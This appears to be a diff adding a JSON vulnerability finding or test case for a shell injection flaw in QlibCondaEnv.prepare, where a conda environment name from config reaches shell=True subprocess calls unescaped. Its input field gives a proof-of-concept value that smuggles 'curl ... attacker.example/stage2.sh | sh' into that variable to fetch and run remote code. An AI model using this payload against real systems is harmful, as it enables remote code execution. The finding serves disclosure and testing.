@@ -1,0 +1,4 @@
+{
+  "description": "QlibCondaEnv.prepare splices the conda_env_name config value unescaped into shell=True subprocess calls, unlike the validated, argv-list-based _prepare_conda_env helper defined in the same file and used by sibling conda env classes, allowing shell command injection via that config value.",
+  "input_parameter": "{\"env_var\":\"QLIB_CONDA_CONDA_ENV_NAME\",\"value\":\"rdagent4qlib; curl -s https://attacker.example/stage2.sh | sh; echo x\"}"
+}
